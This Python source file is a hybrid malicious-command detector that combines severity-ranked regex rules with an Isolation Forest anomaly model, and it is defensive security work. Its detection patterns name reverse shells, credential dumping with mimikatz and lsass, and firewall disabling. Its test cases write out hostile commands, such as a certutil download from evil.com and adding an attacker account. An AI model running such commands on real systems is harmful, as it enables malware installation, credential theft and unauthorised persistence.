"""
CMD Detector - Hybrid Detection System
Combines regex patterns + AI model for malicious command detection
Integrates with cmd_ai_trainer.py
"""

import re
import os
import logging
from typing import Dict, List, Any
import numpy as np
import joblib

logger = logging.getLogger(__name__)
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

# ============================================================================
# PATTERN-BASED DETECTOR (47 Regex Patterns)
# ============================================================================

class CMDDetector:
    """Pattern matching engine for malicious command detection"""
    
    def __init__(self):
        self.patterns = {}
        self._initialize_patterns()
    
    def _initialize_patterns(self):
        """Initialize 47 regex patterns organized by severity"""
        
        # CRITICAL patterns (95%+ confidence)
        self.patterns['CRITICAL'] = [
            (r'cmd\s+/c\s+.*(?:powershell|pwsh).*-enc', 'Encoded PowerShell execution'),
            (r'powershell\s+(?:-e[nc]|-En|-Enc)', 'PowerShell encoded command'),
            (r'cmd\s+/c\s+powershell\s+-e[nc]', 'CMD PowerShell encoding'),
            (r'(?:certutil|bitsadmin|curl|wget).*(?:\.exe|\.dll|\.ps1|http)', 'Malware download attempt'),
            (r'certutil\s+(?:-download|-urlcache)', 'CertUtil download'),
            (r'bitsadmin\s+/transfer', 'BITS download'),
            (r'curl\s+(?:http|ftp).*\|.*(?:powershell|cmd)', 'Piped download'),
            (r'(?:mimikatz|rubeus|laZagne|procdump)', 'Credential stealing tool'),
            (r'cmd\s+/c\s+.*(?:lsass|ntds\.dit|sam)', 'Credential database access'),
            (r'dump.*(?:lsass|process|memory)', 'Memory dump attempt'),
            (r'reg\s+(?:add|import).*(?:SAM|SECURITY|SYSTEM|LSA)', 'Registry persistence'),
            (r'reg\s+(?:save|export).*(?:SAM|SECURITY|SYSTEM)', 'Registry dump'),
            (r'regedit\s+(?:/s|/c).*reg', 'Registry import'),
            (r'wmic\s+(?:process|service)\s+(?:delete|call\s+create)', 'WMIC deletion'),
            (r'taskkill\s+/f\s+/im\s+svchost', 'Force kill system process'),
            (r'sc\s+delete\s+\w+', 'Service deletion'),
            (r'(?:takeown|icacls)\s+.*\/grant', 'Privilege escalation'),
            (r'sc\s+(?:create|start)\s+\w+\s+binPath', 'Service creation for privilege'),
            (r'netsh\s+advfirewall\s+(?:set\s+allprofiles|firewall)\s+state\s+off', 'Firewall disable'),
            (r'netsh\s+firewall\s+set\s+opmode\s+disable', 'Firewall disable (old)'),
            (r'schtasks\s+/create.*\/tr', 'Scheduled task creation'),
            (r'at\s+\d+:\d+\s+(?:run|exec)', 'AT scheduler usage'),
        ]
        
        # HIGH patterns (70%+ confidence)
        self.patterns['HIGH'] = [
            (r'cmd\s+/c\s+.*(?:nc\.exe|ncat|netcat).*-e\s+(?:cmd|powershell)', 'Reverse shell'),
            (r'bash\s+-i\s+>.*&\s+1', 'Bash reverse shell'),
            (r'del\s+/s\s+/q\s+(?:[A-Z]:|\\)', 'Mass file deletion'),
            (r'cipher\s+/w:\s*', 'SSD wipe attempt'),
            (r'format\s+(?:[A-Z]:|\\)', 'Disk format'),
            (r'(?:ipconfig|netstat|arp)\s+.*>\s*\w+\.txt', 'Network recon to file'),
            (r'route\s+print.*>\s*', 'Routing recon'),
            (r'netsh\s+(?:advfirewall|firewall).*rule\s+', 'Firewall rule modification'),
            (r'net\s+user\s+\w+\s+\w+\s+/add', 'User account creation'),
            (r'net\s+localgroup\s+(?:administrators|admin)', 'Group privilege grant'),
            (r'psexec\s+-s', 'PsExec system execution'),
        ]
        
        # MEDIUM patterns (50%+ confidence)
        self.patterns['MEDIUM'] = [
            (r'powershell.*DownloadString', 'PowerShell download'),
            (r'powershell.*IEX', 'PowerShell invoke expression'),
            (r'powershell.*-NoProfile', 'PowerShell no profile'),
            (r'pspasswd\s+', 'PsPasswd usage'),
            (r'rar\s+(?:a|x).*-hp', 'RAR with hidden password'),
            (r'cmd\s+/c\s+(?:start|call).*>>.*&', 'CMD output redirection'),
            (r'powershell.*-WindowStyle\s+Hidden', 'Hidden PowerShell window'),
            (r'powershell.*-nop', 'PowerShell no profile (nop)'),
            (r'powershell.*-w\s+hidden', 'PowerShell hidden window'),
            (r'iex\s+', 'Invoke-Expression shorthand'),
        ]
        
        # LOW patterns (30% confidence)
        self.patterns['LOW'] = [
            (r'python\s+-c\s+', 'Python command execution'),
            (r'perl\s+-e\s+', 'Perl command execution'),
            (r'cscript\s+\w+\.vbs', 'VBScript execution'),
            (r'wscript\s+\w+\.vbs', 'Windows script host'),
        ]
    
    def detect(self, command: str) -> Dict[str, Any]:
        """Detect malicious patterns in a command"""
        command_lower = command.lower()
        
        for severity in ['CRITICAL', 'HIGH', 'MEDIUM', 'LOW']:
            for pattern, description in self.patterns.get(severity, []):
                if re.search(pattern, command_lower, re.IGNORECASE):
                    return {
                        'is_malicious': True,
                        'severity': severity.lower(),
                        'confidence': self._get_confidence(severity),
                        'reason': f"{severity}: {description}",
                        'pattern': pattern,
                        'matched_pattern': description,
                        'method': 'regex'
                    }
        
        return {
            'is_malicious': False,
            'severity': 'unknown',
            'confidence': 0.0,
            'reason': 'No malicious patterns detected',
            'pattern': None,
            'matched_pattern': None,
            'method': 'regex'
        }
    
    def detect_batch(self, commands: List[str]) -> List[Dict[str, Any]]:
        """Detect malicious patterns in multiple commands"""
        return [self.detect(cmd) for cmd in commands]
    
    def _get_confidence(self, severity: str) -> float:
        """Get confidence score based on severity"""
        confidence_map = {
            'CRITICAL': 0.95,
            'HIGH': 0.75,
            'MEDIUM': 0.60,
            'LOW': 0.30
        }
        return confidence_map.get(severity, 0.0)
    
    def get_pattern_count(self) -> Dict[str, int]:
        """Get pattern statistics"""
        return {
            severity: len(patterns) 
            for severity, patterns in self.patterns.items()
        }

# ============================================================================
# AI-BASED DETECTOR (Trained Model Integration)
# ============================================================================

class AICommandDetector:
    """AI-based detection using trained ML models"""
    
    def __init__(self, model_path='isoforest_model.pkl', scaler_path='isoforest_scaler.pkl'):
        """Initialize AI detector with pre-trained model"""
        self.model = None
        self.scaler = None
        self.feature_extractor = None
        self.is_loaded = False
        
        self._load_model(model_path, scaler_path)
    
    def _load_model(self, model_path: str, scaler_path: str):
        """Load pre-trained model and scaler"""
        try:
            if os.path.exists(model_path) and os.path.exists(scaler_path):
                logger.info(f"📂 Loading AI model from {model_path}")
                self.model = joblib.load(model_path)
                self.scaler = joblib.load(scaler_path)
                
                # Import feature extractor
                try:
                    from cmd_ai_trainer import CommandFeatureExtractor
                    self.feature_extractor = CommandFeatureExtractor()
                    self.is_loaded = True
                    logger.info("✅ AI model loaded successfully")
                except ImportError:
                    logger.warning("⚠️  CommandFeatureExtractor not available")
                    self.is_loaded = False
            else:
                logger.warning(f"⚠️  Model files not found. AI detection disabled.")
                self.is_loaded = False
        
        except Exception as e:
            logger.error(f"❌ Failed to load AI model: {e}")
            self.is_loaded = False
    
    def detect(self, command: str) -> Dict[str, Any]:
        """Detect using AI model"""
        if not self.is_loaded:
            return {
                'is_malicious': None,
                'confidence': 0.0,
                'reason': 'AI model not available',
                'method': 'ai',
                'status': 'unavailable'
            }
        
        try:
            features = self.feature_extractor.extract_all_features(command)
            features_scaled = self.scaler.transform([features])
            
            prediction = self.model.predict(features_scaled)[0]
            is_malicious = (prediction == -1)  # -1 = anomaly in Isolation Forest
            
            anomaly_score = abs(self.model.score_samples(features_scaled)[0])
            confidence = float(min(1.0, anomaly_score / 2.0))  # Normalize to [0, 1]
            
            return {
                'is_malicious': bool(is_malicious),
                'confidence': float(confidence),
                'reason': f"AI anomaly score: {anomaly_score:.3f}",
                'method': 'ai',
                'status': 'success'
            }
        
        except Exception as e:
            logger.error(f"❌ AI detection error: {e}")
            return {
                'is_malicious': None,
                'confidence': 0.0,
                'reason': f"AI detection error: {str(e)}",
                'method': 'ai',
                'status': 'error'
            }

# ============================================================================
# HYBRID DETECTOR - Combines Regex + AI
# ============================================================================

class HybridCMDDetector:
    """Hybrid detector combining regex patterns and AI model"""
    
    def __init__(self, use_ai=True):
        """
        Initialize hybrid detector
        
        Args:
            use_ai: Enable AI-based detection if model available
        """
        self.regex_detector = CMDDetector()
        self.ai_detector = AICommandDetector() if use_ai else None
        
        logger.info(f"✅ Hybrid detector initialized")
        logger.info(f"   - Regex patterns: {sum(self.regex_detector.get_pattern_count().values())}")
        logger.info(f"   - AI model: {'✅ Enabled' if self.ai_detector and self.ai_detector.is_loaded else '❌ Disabled'}")
    
    def detect(self, command: str, method='hybrid') -> Dict[str, Any]:
        """
        Detect malicious command
        
        Args:
            command: Command to analyze
            method: 'regex', 'ai', or 'hybrid'
        
        Returns:
            Detection result with is_malicious, severity, confidence, reason
        """
        
        if method == 'regex':
            return self.regex_detector.detect(command)
        
        elif method == 'ai':
            if self.ai_detector and self.ai_detector.is_loaded:
                return self.ai_detector.detect(command)
            else:
                logger.warning("AI model not available, falling back to regex")
                return self.regex_detector.detect(command)
        
        elif method == 'hybrid':
            # First, try regex (faster, more confident)
            regex_result = self.regex_detector.detect(command)
            
            # If regex found something CRITICAL or HIGH, use it
            if regex_result['is_malicious'] and regex_result['severity'] in ['critical', 'high']:
                return {
                    **regex_result,
                    'combined_method': 'regex_confident'
                }
            
            # If AI available, get AI opinion
            if self.ai_detector and self.ai_detector.is_loaded:
                ai_result = self.ai_detector.detect(command)
                
                # If AI and regex agree
                if ai_result['is_malicious'] == regex_result['is_malicious']:
                    combined_confidence = (regex_result['confidence'] + ai_result['confidence']) / 2
                    return {
                        'is_malicious': ai_result['is_malicious'],
                        'severity': regex_result['severity'] if regex_result['is_malicious'] else 'unknown',
                        'confidence': float(min(1.0, combined_confidence * 1.1)),  # Boost combined confidence
                        'reason': f"Confirmed by both regex and AI",
                        'regex_result': regex_result['reason'],
                        'ai_result': ai_result['reason'],
                        'combined_method': 'hybrid_confirmed'
                    }
                
                # If AI detects but regex doesn't
                elif ai_result['is_malicious'] and not regex_result['is_malicious']:
                    return {
                        'is_malicious': True,
                        'severity': 'medium',
                        'confidence': float(ai_result['confidence']),
                        'reason': f"Detected by AI (anomaly score high)",
                        'regex_result': 'No regex match',
                        'ai_result': ai_result['reason'],
                        'combined_method': 'hybrid_ai_detected'
                    }
            
            # Default to regex result
            return {
                **regex_result,
                'combined_method': 'regex_only' if regex_result['is_malicious'] else 'benign'
            }
        
        else:
            raise ValueError(f"Unknown detection method: {method}")
    
    def detect_batch(self, commands: List[str], method='hybrid') -> List[Dict[str, Any]]:
        """Detect multiple commands"""
        return [self.detect(cmd, method=method) for cmd in commands]

# ============================================================================
# MAIN EXECUTION (Standalone Testing)
# ============================================================================

if __name__ == '__main__':
    logger.info("🚀 CMD DETECTOR - Hybrid Mode")
    logger.info("=" * 80)
    
    # Initialize detector
    detector = HybridCMDDetector(use_ai=True)
    
    # Test commands
    test_cases = [
        ("powershell -enc JABhID0gMjAwMzs=", "Encoded PowerShell"),
        ("dir C:\\", "Benign directory listing"),
        ("certutil -download http://evil.com/mal.exe", "Malware download"),
        ("systeminfo", "System info (benign)"),
        ("mimikatz privilege::debug", "Credential theft"),
        ("net user attacker Password123 /add", "Account creation"),
    ]
    
    logger.info("\n🧪 TESTING HYBRID DETECTOR\n")
    logger.info("=" * 80)
    
    for command, description in test_cases:
        result = detector.detect(command, method='hybrid')
        
        status = "🔴 MALICIOUS" if result['is_malicious'] else "🟢 BENIGN"
        confidence = result['confidence'] * 100
        severity = result.get('severity', 'unknown').upper()
        method = result.get('combined_method', 'unknown')
        
        logger.info(f"\n{status} | {confidence:.1f}% | {severity}")
        logger.info(f"  Description: {description}")
        logger.info(f"  Command: {command[:70]}")
        logger.info(f"  Reason: {result['reason']}")
        logger.info(f"  Method: {method}")
    
    logger.info("\n" + "=" * 80)
    logger.info("✅ Hybrid detector ready for integration!")
    logger.info("=" * 80)